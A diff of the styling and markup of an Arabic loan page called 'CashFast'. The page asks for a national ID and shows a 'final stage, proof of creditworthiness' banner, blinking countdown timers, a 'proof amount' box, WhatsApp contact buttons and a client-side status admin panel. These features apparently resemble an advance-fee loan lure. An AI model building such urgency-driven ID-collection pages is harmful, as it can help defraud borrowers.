-  .proof-amount-box .value .cur { font-size: 1.2rem; color: var(--text-muted); font-weight: 700; }
-  .proof-amount-box .note { font-size: 0.65rem; color: var(--text-muted); margin-top: 0.1rem; line-height: 1.9; }
-  .proof-amount-box .note .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .proof-amount-box .note .hl-emerald { color: var(--primary-dark); font-weight: 800; }
-  .proof-amount-box .note .hl-danger { color: var(--danger); font-weight: 800; }
+        .timer-box {
+            background: rgba(212, 175, 55, 0.06);
+            border: 2px solid var(--gold);
+            border-radius: var(--radius-md);
+            text-align: center; padding: 0.6rem; margin: 0.6rem 0;
+            position: relative; z-index: 1; animation: pulseGold 1.5s infinite alternate;
+        }
+        @keyframes pulseGold { 0% { box-shadow: 0 0 5px rgba(212, 175, 55, 0.05); } 100% { box-shadow: 0 0 25px rgba(212, 175, 55, 0.12); } }
+        .timer-box .timer { font-family: monospace; font-size: 2.2rem; font-weight: 800; background: rgba(0, 0, 0, 0.4); display: inline-block; padding: 0.1rem 1.2rem; border-radius: 1.5rem; color: var(--gold); letter-spacing: 4px; }
+        .timer-box .timer.danger { color: var(--danger); animation: blinkTimer 0.8s ease-in-out infinite; }
+        @keyframes blinkTimer { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .timer-box .sub { font-size: 0.65rem; color: var(--text-muted); margin-top: 0.1rem; }
+        .timer-box .sub .hl-gold { color: var(--gold); font-weight: 700; }
+        .timer-box .sub .hl-danger { color: var(--danger); font-weight: 700; }
 
-  .timer-box {
-    background: var(--gold-light);
-    border: 2px solid var(--gold);
-    border-radius: var(--radius-md);
-    text-align: center; padding: 0.6rem; margin: 0.6rem 0;
-    position: relative; z-index: 1; animation: pulseGold 1.5s infinite alternate;
-  }
-  @keyframes pulseGold { 0% { box-shadow: 0 0 5px rgba(184,145,46,0.08); } 100% { box-shadow: 0 0 25px rgba(184,145,46,0.2); } }
-  .timer-box .timer { font-family: monospace; font-size: 2.2rem; font-weight: 900; background: #FFFFFF; display: inline-block; padding: 0.1rem 1.2rem; border-radius: 1.5rem; color: var(--gold-dark); letter-spacing: 4px; box-shadow: inset 0 0 0 1px rgba(184,145,46,0.2); }
-  .timer-box .timer.danger { color: var(--danger); animation: blinkTimer 0.8s ease-in-out infinite; }
-  @keyframes blinkTimer { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-  .timer-box .sub { font-size: 0.65rem; color: var(--text-muted); margin-top: 0.3rem; line-height: 1.8; }
-  .timer-box .sub .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .timer-box .sub .hl-danger { color: var(--danger); font-weight: 800; }
+        .steps-box {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: var(--radius-md);
+            padding: 0.8rem; margin: 0.6rem 0;
+            position: relative; z-index: 1; border: 1px solid var(--glass-border);
+        }
+        .steps-box .step { display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.4rem 0; border-bottom: 1px solid rgba(255, 255, 255, 0.03); }
+        .steps-box .step:last-child { border-bottom: none; }
+        .steps-box .step .num { min-width: 28px; height: 28px; border-radius: 50%; background: var(--purple); color: #0A0F1A; font-weight: 800; font-size: 0.7rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 0.1rem; }
+        .steps-box .step .content { color: var(--text-muted); font-size: 0.8rem; line-height: 1.8; }
+        .steps-box .step .content strong { color: #FFF; }
+        .steps-box .step .content .hl-gold { color: var(--gold); font-weight: 700; }
+        .steps-box .step .content .hl-emerald { color: var(--emerald); font-weight: 700; }
+        .steps-box .step .content .hl-danger { color: var(--danger); font-weight: 700; }
+        .steps-box .step .content .hl-purple { color: var(--purple); font-weight: 700; }
 
-  .steps-box {
-    background: var(--bg-soft);
-    border-radius: var(--radius-md);
-    padding: 0.8rem; margin: 0.6rem 0;
-    position: relative; z-index: 1; border: 1px solid var(--border);
-  }
-  .steps-box .step { display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.5rem 0; border-bottom: 1px solid var(--border); }
-  .steps-box .step:last-child { border-bottom: none; }
-  .steps-box .step .num { min-width: 30px; height: 30px; border-radius: 50%; background: linear-gradient(135deg, var(--purple), #5B21B6); color: #FFFFFF; font-weight: 800; font-size: 0.75rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 0.1rem; box-shadow: 0 3px 10px rgba(124,58,237,0.25); }
-  .steps-box .step .content { color: var(--text-muted); font-size: 0.8rem; line-height: 1.9; }
-  .steps-box .step .content strong { color: var(--text); font-weight: 800; }
-  .steps-box .step .content .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .steps-box .step .content .hl-emerald { color: var(--primary-dark); font-weight: 800; }
-  .steps-box .step .content .hl-danger { color: var(--danger); font-weight: 800; }
-  .steps-box .step .content .hl-purple { color: var(--purple); font-weight: 800; }
+        .important-notes {
+            background: rgba(239, 68, 68, 0.04);
+            border-right: 4px solid var(--danger);
+            padding: 0.8rem;
+            border-radius: var(--radius-sm);
+            margin: 0.6rem 0;
+            position: relative; z-index: 1;
+        }
+        .important-notes .title { color: var(--danger); font-weight: 800; font-size: 0.85rem; display: flex; align-items: center; gap: 0.4rem; }
+        .important-notes .title i { font-size: 1rem; }
+        .important-notes ul { list-style: none; padding: 0; margin: 0.3rem 0 0 0; }
+        .important-notes ul li { color: var(--text-muted); font-size: 0.75rem; line-height: 1.8; padding-right: 1.2rem; position: relative; }
+        .important-notes ul li::before { content: '•'; position: absolute; right: 0; color: var(--danger); font-weight: 700; }
+        .important-notes ul li .hl-gold { color: var(--gold); font-weight: 700; }
+        .important-notes ul li .hl-danger { color: var(--danger); font-weight: 700; }
+        .important-notes ul li .hl-emerald { color: var(--emerald); font-weight: 700; }
 
-  .important-notes {
-    background: var(--danger-light);
-    border-right: 4px solid var(--danger);
-    padding: 0.8rem;
-    border-radius: var(--radius-sm);
-    margin: 0.6rem 0;
-    position: relative; z-index: 1;
-  }
-  .important-notes .title { color: var(--danger); font-weight: 800; font-size: 0.85rem; display: flex; align-items: center; gap: 0.4rem; }
-  .important-notes .title i { font-size: 1rem; }
-  .important-notes ul { list-style: none; padding: 0; margin: 0.4rem 0 0 0; }
-  .important-notes ul li { color: var(--text-muted); font-size: 0.75rem; line-height: 1.9; padding-right: 1.2rem; position: relative; }
-  .important-notes ul li::before { content: '•'; position: absolute; right: 0; color: var(--danger); font-weight: 900; }
-  .important-notes ul li .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .important-notes ul li .hl-danger { color: var(--danger); font-weight: 800; }
-  .important-notes ul li .hl-emerald { color: var(--primary-dark); font-weight: 800; }
+        .summary-box {
+            background: rgba(46, 204, 113, 0.04);
+            border-right: 3px solid var(--emerald);
+            padding: 0.8rem;
+            border-radius: var(--radius-sm);
+            margin: 0.6rem 0;
+            position: relative; z-index: 1;
+        }
+        .summary-box p { color: var(--text-muted); font-size: 0.8rem; line-height: 1.9; margin: 0; }
+        .summary-box p .hl-gold { color: var(--gold); font-weight: 700; }
+        .summary-box p .hl-emerald { color: var(--emerald); font-weight: 700; }
+        .summary-box p .hl-danger { color: var(--danger); font-weight: 700; }
 
-  .summary-box {
-    background: var(--primary-light);
-    border-right: 3px solid var(--primary);
-    padding: 0.8rem;
-    border-radius: var(--radius-sm);
-    margin: 0.6rem 0;
-    position: relative; z-index: 1;
-  }
-  .summary-box p { color: var(--text-muted); font-size: 0.8rem; line-height: 1.9; margin: 0; }
-  .summary-box p .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .summary-box p .hl-emerald { color: var(--primary-dark); font-weight: 800; }
-  .summary-box p .hl-danger { color: var(--danger); font-weight: 800; }
+        .btn { width: 100%; padding: 0.8rem; border: none; border-radius: 3rem; font-weight: 700; font-size: 0.85rem; font-family: 'Cairo', sans-serif; display: flex; align-items: center; justify-content: center; gap: 0.6rem; cursor: pointer; transition: var(--transition); position: relative; z-index: 1; }
+        .btn:hover { transform: scale(1.02); }
+        .btn-whatsapp { background: linear-gradient(135deg, #25D366, #128C7E); color: #FFF; box-shadow: 0 4px 20px rgba(37, 211, 102, 0.2); }
+        .btn-whatsapp:hover { box-shadow: 0 0 40px rgba(37, 211, 102, 0.35); }
+        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #0A0F1A; box-shadow: 0 4px 20px rgba(212, 175, 55, 0.2); }
+        .btn-gold:hover { box-shadow: 0 0 40px rgba(212, 175, 55, 0.35); }
+        .btn-purple { background: linear-gradient(135deg, var(--purple), #6D28D9); color: #FFF; box-shadow: 0 4px 20px rgba(139, 92, 246, 0.2); }
+        .btn-purple:hover { box-shadow: 0 0 40px rgba(139, 92, 246, 0.35); }
+        .btn-emerald { background: linear-gradient(135deg, var(--emerald), var(--emerald-dark)); color: #0A0F1A; box-shadow: 0 4px 20px rgba(46, 204, 113, 0.2); }
+        .btn-emerald:hover { box-shadow: 0 0 40px rgba(46, 204, 113, 0.35); }
+        .btn-danger { background: linear-gradient(135deg, #FF6B6B, #EE4444); color: #FFF; box-shadow: 0 4px 20px rgba(239, 68, 68, 0.2); }
+        .btn-danger:hover { box-shadow: 0 0 40px rgba(239, 68, 68, 0.35); }
 
-  .btn { width: 100%; padding: 0.85rem; border: none; border-radius: 3rem; font-weight: 800; font-size: 0.85rem; font-family: var(--font); display: flex; align-items: center; justify-content: center; gap: 0.6rem; cursor: pointer; transition: var(--transition); position: relative; z-index: 1; }
-  .btn:hover { transform: translateY(-2px); }
-  .btn-whatsapp { background: linear-gradient(135deg, #25D366, #128C7E); color: #FFFFFF; box-shadow: 0 6px 20px rgba(37,211,102,0.25); }
-  .btn-whatsapp:hover { box-shadow: 0 10px 30px rgba(37,211,102,0.4); }
-  .btn-gold { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: #FFFFFF; box-shadow: 0 6px 20px rgba(184,145,46,0.25); }
-  .btn-gold:hover { box-shadow: 0 10px 30px rgba(184,145,46,0.4); }
-  .btn-purple { background: linear-gradient(135deg, var(--purple), #5B21B6); color: #FFFFFF; box-shadow: 0 6px 20px rgba(124,58,237,0.25); }
-  .btn-purple:hover { box-shadow: 0 10px 30px rgba(124,58,237,0.4); }
+        .client-info {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: var(--radius-md);
+            padding: 0.7rem 0.8rem;
+            border: 1px solid var(--glass-border);
+            position: relative; z-index: 1;
+        }
+        .client-info .row { display: flex; justify-content: space-between; padding: 0.3rem 0; border-bottom: 1px solid rgba(255, 255, 255, 0.03); font-size: 0.75rem; }
+        .client-info .row:last-child { border-bottom: none; }
+        .client-info .row .k { color: var(--text-muted); }
+        .client-info .row .v { font-weight: 600; text-align: left; color: #FFF; }
+        .client-info .row .v.gold { color: var(--gold); }
+        .client-info .row .v.green { color: var(--emerald); }
+        .client-info .row .v.danger { color: var(--danger); }
 
-  .client-info {
-    background: var(--bg-card);
-    border-radius: var(--radius-md);
-    padding: 0.7rem 0.9rem;
-    border: 1px solid var(--border);
-    position: relative; z-index: 1;
-    box-shadow: var(--shadow-sm);
-  }
-  .client-info .row { display: flex; justify-content: space-between; padding: 0.35rem 0; border-bottom: 1px solid var(--border); font-size: 0.75rem; }
-  .client-info .row:last-child { border-bottom: none; }
-  .client-info .row .k { color: var(--text-muted); font-weight: 600; }
-  .client-info .row .v { font-weight: 800; text-align: left; color: var(--text); }
-  .client-info .row .v.gold { color: var(--gold-dark); }
-  .client-info .row .v.green { color: var(--primary-dark); }
-  .client-info .row .v.danger { color: var(--danger); }
+        .payment-notice {
+            background: rgba(46, 204, 113, 0.04);
+            border: 2px solid var(--emerald);
+            border-radius: var(--radius-md);
+            padding: 0.8rem;
+            margin: 0.6rem 0;
+            text-align: center;
+            position: relative; z-index: 1;
+        }
+        .payment-notice .icon { font-size: 2.5rem; color: var(--emerald); display: block; margin-bottom: 0.2rem; }
+        .payment-notice h4 { color: var(--emerald); font-size: 1rem; font-weight: 800; }
+        .payment-notice p { color: var(--text-muted); font-size: 0.75rem; line-height: 1.8; margin-top: 0.1rem; }
+        .payment-notice p .hl-gold { color: var(--gold); font-weight: 700; }
+        .payment-notice p .hl-danger { color: var(--danger); font-weight: 700; }
 
-  .payment-notice {
-    background: var(--primary-light);
-    border: 2px solid var(--primary);
-    border-radius: var(--radius-md);
-    padding: 0.9rem;
-    margin: 0.6rem 0;
-    text-align: center;
-    position: relative; z-index: 1;
-  }
-  .payment-notice .icon { font-size: 2.5rem; color: var(--primary); display: block; margin-bottom: 0.2rem; }
-  .payment-notice h4 { color: var(--primary-dark); font-size: 1rem; font-weight: 900; line-height: 1.5; }
-  .payment-notice p { color: var(--text-muted); font-size: 0.75rem; line-height: 1.9; margin-top: 0.3rem; }
-  .payment-notice p .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .payment-notice p .hl-danger { color: var(--danger); font-weight: 800; }
+        .pending-card {
+            background: linear-gradient(145deg, #1a1a2e, #0f0f1f);
+            border-radius: var(--radius-lg);
+            padding: 2rem 1.5rem;
+            border: 3px solid var(--gold);
+            text-align: center;
+            position: relative; z-index: 1;
+            box-shadow: 0 0 60px rgba(212, 175, 55, 0.08);
+        }
+        .pending-card .icon { font-size: 4rem; color: var(--gold); margin-bottom: 0.5rem; }
+        .pending-card h2 { font-size: 1.6rem; font-weight: 900; color: #FFF; margin-bottom: 0.3rem; }
+        .pending-card h2 span { color: var(--gold); }
+        .pending-card .sub { font-size: 0.95rem; color: var(--text-muted); line-height: 2; margin-bottom: 1rem; }
+        .pending-card .sub .hl-gold { color: var(--gold); font-weight: 700; }
+        .pending-card .sub .hl-emerald { color: var(--emerald); font-weight: 700; }
+        .pending-card .sub .hl-danger { color: var(--danger); font-weight: 700; }
+        .pending-card .sub .hl-purple { color: var(--purple); font-weight: 700; }
+        .pending-card .btn-whatsapp { max-width: 280px; margin: 0.5rem auto; }
+        .pending-card .note { margin-top: 1rem; padding: 0.8rem; background: rgba(239, 68, 68, 0.06); border: 1px solid rgba(239, 68, 68, 0.15); border-radius: var(--radius-md); font-size: 0.75rem; color: var(--text-muted); line-height: 1.8; }
+        .pending-card .note .hl-danger { color: var(--danger); font-weight: 700; }
 
-  .pending-card {
-    background: linear-gradient(145deg, #FFFFFF, var(--gold-light));
-    border-radius: var(--radius-lg);
-    padding: 1.8rem 1.2rem;
-    border: 3px solid var(--gold);
-    text-align: center;
-    position: relative; z-index: 1;
-    box-shadow: 0 8px 32px rgba(184,145,46,0.12);
-  }
-  .pending-card .icon { font-size: 4rem; color: var(--gold-dark); margin-bottom: 0.5rem; }
-  .pending-card h2 { font-size: 1.6rem; font-weight: 900; color: var(--text); margin-bottom: 0.3rem; }
-  .pending-card h2 span { color: var(--gold-dark); }
-  .pending-card .sub { font-size: 0.9rem; color: var(--text-muted); line-height: 2; margin-bottom: 1rem; }
-  .pending-card .sub .hl-gold { color: var(--gold-dark); font-weight: 800; }
-  .pending-card .sub .hl-emerald { color: var(--primary-dark); font-weight: 800; }
-  .pending-card .sub .hl-danger { color: var(--danger); font-weight: 800; }
-  .pending-card .sub .hl-purple { color: var(--purple); font-weight: 800; }
-  .pending-card .btn-whatsapp { max-width: 280px; margin: 0.5rem auto; }
-  .pending-card .note { margin-top: 1rem; padding: 0.8rem; background: var(--danger-light); border: 1px solid rgba(220,38,38,0.2); border-radius: var(--radius-md); font-size: 0.75rem; color: var(--text-muted); line-height: 1.9; }
-  .pending-card .note .hl-danger { color: var(--danger); font-weight: 800; }
+        .pending-timer-box {
+            background: rgba(239, 68, 68, 0.06);
+            border: 2px solid var(--danger);
+            border-radius: var(--radius-md);
+            text-align: center;
+            padding: 0.8rem;
+            margin: 0.8rem 0;
+            position: relative;
+            z-index: 1;
+            animation: pulseDanger 1.5s infinite alternate;
+        }
+        @keyframes pulseDanger { 0% { box-shadow: 0 0 5px rgba(239, 68, 68, 0.05); } 100% { box-shadow: 0 0 30px rgba(239, 68, 68, 0.15); } }
+        .pending-timer-box .timer {
+            font-family: monospace;
+            font-size: 2.8rem;
+            font-weight: 900;
+            background: rgba(0, 0, 0, 0.5);
+            display: inline-block;
+            padding: 0.1rem 1.5rem;
+            border-radius: 1.5rem;
+            color: var(--danger);
+            letter-spacing: 5px;
+            animation: blinkTimer 0.8s ease-in-out infinite;
+        }
+        .pending-timer-box .label { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.3rem; }
+        .pending-timer-box .label .hl-danger { color: var(--danger); font-weight: 700; }
 
-  .pending-timer-box {
-    background: var(--danger-light);
-    border: 2px solid var(--danger);
-    border-radius: var(--radius-md);
-    text-align: center;
-    padding: 0.8rem;
-    margin: 0.8rem 0;
-    position: relative;
-    z-index: 1;
-    animation: pulseDanger 1.5s infinite alternate;
-  }
-  @keyframes pulseDanger { 0% { box-shadow: 0 0 5px rgba(220,38,38,0.08); } 100% { box-shadow: 0 0 30px rgba(220,38,38,0.2); } }
-  .pending-timer-box .timer {
-    font-family: monospace;
-    font-size: 2.8rem;
-    font-weight: 900;
-    background: #FFFFFF;
-    display: inline-block;
-    padding: 0.1rem 1.5rem;
-    border-radius: 1.5rem;
-    color: var(--danger);
-    letter-spacing: 5px;
-    animation: blinkTimer 0.8s ease-in-out infinite;
-    box-shadow: inset 0 0 0 1px rgba(220,38,38,0.2);
-  }
-  .pending-timer-box .label { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.3rem; }
-  .pending-timer-box .label .hl-danger { color: var(--danger); font-weight: 800; }
+        .error-card {
+            background: rgba(239, 68, 68, 0.06);
+            border: 1px solid var(--danger);
+            border-radius: var(--radius-md);
+            padding: 1rem;
+            text-align: center;
+            color: var(--danger);
+            font-size: 0.8rem;
+            display: none;
+            margin-top: 0.6rem;
+        }
+        .loader { text-align: center; display: none; padding: 0.8rem 0; }
+        .loader i { color: var(--gold); font-size: 1.8rem; }
+        .loader p { color: var(--text-muted); font-size: 0.7rem; margin-top: 0.2rem; }
 
-  .error-card {
-    background: var(--danger-light);
-    border: 1px solid var(--danger);
-    border-radius: var(--radius-md);
-    padding: 1rem;
-    text-align: center;
-    color: var(--danger);
-    font-size: 0.8rem;
-    display: none;
-    margin-top: 0.6rem;
-    font-weight: 700;
-    line-height: 1.8;
-  }
-  .loader { text-align: center; display: none; padding: 0.8rem 0; }
-  .loader i { color: var(--primary); font-size: 1.8rem; }
-  .loader p { color: var(--text-muted); font-size: 0.7rem; margin-top: 0.2rem; }
+        .footer { text-align: center; margin-top: 1.2rem; font-size: 0.6rem; color: var(--text-muted); position: relative; z-index: 1; }
 
-  .footer { text-align: center; margin-top: 1.2rem; font-size: 0.65rem; color: var(--text-muted); position: relative; z-index: 1; font-weight: 600; }
-  .footer i { color: var(--success); }
+        .admin-panel {
+            display: none;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: var(--radius-md);
+            padding: 0.8rem;
+            border: 1px solid var(--glass-border);
+            position: relative; z-index: 1;
+            margin-top: 0.8rem;
+        }
+        .admin-panel.show { display: block; }
+        .admin-panel .title { font-size: 0.75rem; color: var(--gold); font-weight: 700; text-align: center; margin-bottom: 0.4rem; }
+        .admin-panel .group { display: flex; gap: 0.3rem; flex-wrap: wrap; }
+        .admin-panel .group button { flex: 1; min-width: 70px; padding: 0.4rem 0.5rem; border: none; border-radius: 3rem; font-size: 0.6rem; font-weight: 700; cursor: pointer; transition: var(--transition); font-family: 'Cairo', sans-serif; }
+        .admin-panel .group button:hover { transform: scale(1.03); }
+        .btn-admin-pending { background: var(--warning); color: #0A0F1A; }
+        .btn-admin-completed { background: var(--emerald); color: #0A0F1A; }
+        .btn-admin-blocked { background: var(--danger); color: #FFF; }
+        .admin-panel .status-text { font-size: 0.65rem; color: var(--text-muted); text-align: center; margin-top: 0.3rem; }
 
-  .admin-panel {
-    display: none;
-    background: var(--bg-soft);
-    border-radius: var(--radius-md);
-    padding: 0.8rem;
-    border: 1px solid var(--border);
-    position: relative; z-index: 1;
-    margin-top: 0.8rem;
-  }
-  .admin-panel.show { display: block; }
-  .admin-panel .title { font-size: 0.75rem; color: var(--gold-dark); font-weight: 800; text-align: center; margin-bottom: 0.4rem; }
-  .admin-panel .group { display: flex; gap: 0.3rem; flex-wrap: wrap; }
-  .admin-panel .group button { flex: 1; min-width: 70px; padding: 0.4rem 0.5rem; border: none; border-radius: 3rem; font-size: 0.6rem; font-weight: 800; cursor: pointer; transition: var(--transition); font-family: var(--font); color: #FFFFFF; }
-  .admin-panel .group button:hover { transform: translateY(-1px); }
-  .btn-admin-active { background: var(--primary); }
-  .btn-admin-pending { background: var(--warning); }
-  .btn-admin-deleted { background: var(--danger); }
-  .btn-admin-completed { background: var(--cyan); }
-  .admin-panel .status-text { font-size: 0.65rem; color: var(--text-muted); text-align: center; margin-top: 0.4rem; font-weight: 600; }
-
-  @media (max-width: 440px) {
-    .app { padding: 1rem 0.8rem; border-radius: var(--radius-lg); }
-    .watermark::before { font-size: 5rem; }
-    .watermark::after { font-size: 1rem; line-height: 3rem; }
-    .brand .text .main { font-size: 1.1rem; }
-    .brand .logo-wrap { width: 38px; height: 38px; font-size: 1.2rem; }
-    .header .badge-status { font-size: 0.5rem; padding: 0.15rem 0.6rem; }
-    .header .support-btn { font-size: 0.5rem; padding: 0.15rem 0.5rem; }
-    .final-stage-banner { padding: 0.4rem 0.8rem; gap: 0.4rem; }
-    .final-stage-banner i { font-size: 1rem; }
-    .final-stage-banner .text { font-size: 0.7rem; }
-    .search-box { flex-direction: column; }
-    .search-box button { width: 100%; justify-content: center; }
-    .loan-card .amount { font-size: 2rem; }
-    .loan-grid { grid-template-columns: 1fr 1fr 1fr; gap: 0.3rem; }
-    .loan-grid .item .val { font-size: 0.75rem; }
-    .proof-header h2 { font-size: 1.1rem; }
-    .proof-amount-box .value { font-size: 2rem; }
-    .steps-box .step .content { font-size: 0.7rem; }
-    .tabs .tab { font-size: 0.55rem; padding: 0.3rem 0.1rem; }
-    .timer-box .timer { font-size: 1.6rem; }
-    .client-info .row { font-size: 0.65rem; }
-    .admin-panel .group button { font-size: 0.55rem; padding: 0.3rem 0.4rem; min-width: 55px; }
-    .pending-card h2 { font-size: 1.2rem; }
-    .pending-card .sub { font-size: 0.8rem; }
-    .pending-card .icon { font-size: 3rem; }
-    .pending-timer-box .timer { font-size: 2rem; }
-  }
-  @media (max-width: 360px) {
-    .brand .text .main { font-size: 0.95rem; }
-    .brand .logo-wrap { width: 32px; height: 32px; font-size: 1rem; }
-    .header .badge-status { display: none; }
-    .loan-grid { grid-template-columns: 1fr 1fr; }
-    .final-stage-banner .text { font-size: 0.6rem; }
-    .final-stage-banner i { font-size: 0.8rem; }
-    .proof-amount-box .value { font-size: 1.6rem; }
-    .timer-box .timer { font-size: 1.3rem; }
-    .pending-timer-box .timer { font-size: 1.6rem; }
-  }
-</style>
+        @media (max-width: 440px) {
+            .app { padding: 1rem 0.8rem; border-radius: var(--radius-lg); }
+            .brand .text .main { font-size: 1.1rem; }
+            .brand .logo-wrap { width: 38px; height: 38px; font-size: 1.2rem; }
+            .header .badge-status { font-size: 0.5rem; padding: 0.15rem 0.6rem; }
+            .header .support-btn { font-size: 0.5rem; padding: 0.15rem 0.5rem; }
+            .final-stage-banner { padding: 0.4rem 0.8rem; gap: 0.4rem; }
+            .final-stage-banner i { font-size: 1rem; }
+            .final-stage-banner .text { font-size: 0.7rem; }
+            .search-box button { font-size: 0.65rem; padding: 0.6rem 1rem; }
+            .loan-card .amount { font-size: 2rem; }
+            .loan-grid { grid-template-columns: 1fr 1fr 1fr; gap: 0.3rem; }
+            .loan-grid .item .val { font-size: 0.75rem; }
+            .proof-header h2 { font-size: 1.1rem; }
+            .proof-amount-box .value { font-size: 2rem; }
+            .steps-box .step .content { font-size: 0.7rem; }
+            .search-box { flex-direction: column; }
+            .search-box button { width: 100%; justify-content: center; }
+            .tabs .tab { font-size: 0.55rem; padding: 0.3rem 0.1rem; }
+            .timer-box .timer { font-size: 1.6rem; }
+            .client-info .row { font-size: 0.65rem; flex-wrap: wrap; gap: 0.1rem; }
+            .admin-panel .group button { font-size: 0.55rem; padding: 0.3rem 0.4rem; min-width: 55px; }
+            .pending-card h2 { font-size: 1.2rem; }
+            .pending-card .sub { font-size: 0.8rem; }
+            .pending-card .icon { font-size: 3rem; }
+            .payment-notice .icon { font-size: 2rem; }
+            .payment-notice h4 { font-size: 0.85rem; }
+            .pending-timer-box .timer { font-size: 2rem; }
+        }
+        @media (max-width: 360px) {
+            .brand .text .main { font-size: 0.95rem; }
+            .brand .logo-wrap { width: 32px; height: 32px; font-size: 1rem; }
+            .header .badge-status { display: none; }
+            .loan-grid { grid-template-columns: 1fr 1fr; }
+            .final-stage-banner .text { font-size: 0.6rem; }
+            .final-stage-banner i { font-size: 0.8rem; }
+            .proof-amount-box .value { font-size: 1.6rem; }
+            .timer-box .timer { font-size: 1.3rem; }
+            .pending-timer-box .timer { font-size: 1.6rem; }
+        }
+    </style>
 </head>
 <body>
 
-  <div class="watermark"></div>
-  <div class="bg-layer"></div>
-  <div class="bg-grid"></div>
+    <div class="bg-layer"></div>
+    <div class="bg-grid"></div>
 
-  <div class="app">
+    <div class="app">
 
-    <header class="header">
-      <div class="brand" id="brandLogo">
-        <div class="logo-wrap"><span class="pulse-ring"></span><span>⚡</span></div>
-        <div class="text">
-          <span class="main">Cash<span>Fast</span></span>
-          <span class="sub">منصة التمويل الذكية</span>
+        <header class="header">
+            <div class="brand" id="brandLogo">
+                <div class="logo-wrap"><span class="pulse-ring"></span><span>⚡</span></div>
+                <div class="text"><span class="main">Cash<span>Fast</span></span><span class="sub">منصة التمويل الذكية</span></div>
+            </div>
+            <div class="right">
+                <div class="badge-status"><span class="dot"></span><span>نشط</span></div>
+                <button class="support-btn" id="supportHeaderBtn" title="الدعم الفني"><i class="fas fa-headset"></i><span class="hide-mobile">دعم</span></button>
+            </div>
+        </header>
+
+        <div class="final-stage-banner">
+            <i class="fas fa-star"></i>
+            <span class="text">🏆 <span class="hl-gold">المرحلة النهائية</span> — <span class="hl-emerald">إثبات الجدارة الائتمانية</span></span>
+            <i class="fas fa-flag-checkered"></i>
         </div>
-      </div>
-      <div class="right">
-        <div class="badge-status"><span class="dot"></span><span>🟢 نشط</span></div>
-        <button class="support-btn" id="supportHeaderBtn" title="الدعم الفني"><i class="fas fa-headset"></i><span>💬 دعم</span></button>
-      </div>
-    </header>
 
-    <div class="final-stage-banner">
-      <i class="fas fa-star"></i>
-      <span class="text">🏆 <span class="hl-gold">المرحلة النهائية</span> — <span class="hl-emerald">إثبات الجدارة الائتمانية</span></span>
-      <i class="fas fa-flag-checkered"></i>
+        <div class="tabs">
+            <div class="tab active"><i class="fas fa-file-invoice"></i> مرحلتك النهائية</div>
+            <div class="tab"><i class="fas fa-clock"></i> سيتم التحويل لك</div>
+            <div class="tab"><i class="fas fa-list"></i> يتم الصرف لحسابك</div>
+        </div>
+
+        <div class="search-box">
+            <input type="text" id="nationalId" placeholder="الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
+            <button onclick="searchCustomer()"><i class="fas fa-money-bill-wave"></i> حولى الان وحجز موعد </button>
+        </div>
+
+        <div id="resultArea"></div>
+
+        <div class="error-card" id="errorBox"><i class="fas fa-exclamation-triangle"></i><p>⚠️ الرقم القومي غير مسجل في النظام. يرجى الانتظار لحين دخول طلبك.</p></div>
+
+        <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse"></i><p>جاري جلب البيانات...</p></div>
+
+        <div class="admin-panel" id="adminPanel">
+            <div class="title"><i class="fas fa-cog"></i> تغيير حالة العميل</div>
+            <div class="group">
+                <button class="btn-admin-pending" onclick="changeStatus('pending')">⏳ قيد الإجراء</button>
+                <button class="btn-admin-completed" onclick="changeStatus('completed')">✅ تم الاستلام</button>
+                <button class="btn-admin-blocked" onclick="changeStatus('blocked')">🚫 محظور</button>
+            </div>
+            <div class="status-text" id="adminStatusDisplay">الحالة الحالية: <span id="currentStatusText">غير محدد</span></div>
+        </div>
+
+        <div class="footer"><i class="fas fa-shield-alt"></i> جميع البيانات مشفرة | إثبات الجدارة لا يتطلب دفع أي أموال للشركة</div>
+
     </div>
 
-    <div class="tabs">
-      <div class="tab active"><i class="fas fa-file-invoice"></i> ✨ مرحلتك النهائية</div>
-      <div class="tab"><i class="fas fa-clock"></i> ⏳ سيتم التحويل لك</div>
-      <div class="tab"><i class="fas fa-list"></i> ✅ يتم الصرف لحسابك</div>
-    </div>
-
-    <div class="search-box">
-      <input type="text" id="nationalId" placeholder="🔢 الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
-      <button onclick="searchCustomer()"><i class="fas fa-money-bill-wave"></i> 💸 استعلام</button>
-    </div>
-
-    <div id="resultArea"></div>
-
-    <div class="error-card" id="errorBox">
-      <i class="fas fa-exclamation-triangle"></i>
-      <p>⚠️ الرقم القومي غير مسجل في النظام. يرجى الانتظار لحين دخول طلبك.</p>
-    </div>
-
-    <div class="loader" id="loader"><i class="fas fa-spinner fa-pulse"></i><p>⏳ جاري جلب البيانات...</p></div>
-
-    <div class="admin-panel" id="adminPanel">
-      <div class="title"><i class="fas fa-cog"></i> ⚙️ تغيير حالة العميل</div>
-      <div class="group">
-        <button class="btn-admin-active" onclick="changeStatus('active')">🟢 نشط</button>
-        <button class="btn-admin-pending" onclick="changeStatus('pending')">⏳ معلق</button>
-        <button class="btn-admin-deleted" onclick="changeStatus('deleted')">🚫 مشطوب</button>
-        <button class="btn-admin-completed" onclick="changeStatus('completed')">✅ تم الاستلام</button>
-      </div>
-      <div class="status-text" id="adminStatusDisplay">الحالة الحالية: <span id="currentStatusText">غير محدد</span></div>
-    </div>
-
